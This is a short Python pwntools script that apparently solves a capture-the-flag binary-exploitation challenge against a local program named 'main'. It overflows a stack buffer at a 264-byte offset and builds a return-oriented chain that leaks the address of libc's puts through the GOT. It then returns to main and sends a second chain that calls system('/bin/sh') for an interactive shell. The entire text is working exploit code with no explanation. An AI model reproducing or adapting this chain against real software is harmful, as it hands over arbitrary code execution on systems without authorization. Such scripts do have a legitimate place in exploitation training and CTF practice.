from pwn import *

context.binary = exe = ELF('./main', checksec=False)
libc = ELF('libc.so.6', checksec=False)
p = process(exe.path) 
p.sendafter(b'> ', b'A'*4000) 
p.sendafter(b'> ', b'A'*2969)

p.recvuntil(b'?\n')
p.sendafter(b'> ', b'Y')
payload = b'A'*264
pop_rdi = 0x00000000004014b3
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

p.recvuntil(b'w.\n')
p.sendafter(b'> ', payload)
p.recvuntil(b'!\n')
libc_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = libc_leak - libc.sym['puts']

p.sendafter(b'> ', b'A'*4000) 
p.sendafter(b'> ', b'A'*2969)
p.recvuntil(b'letter?\n')
p.sendafter(b'> ', b'Y')

ret = 0x000000000040101a
payload = b'A'*264 + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.recvuntil(b'now.\n')
p.sendafter(b'> ', payload)
p.interactive()
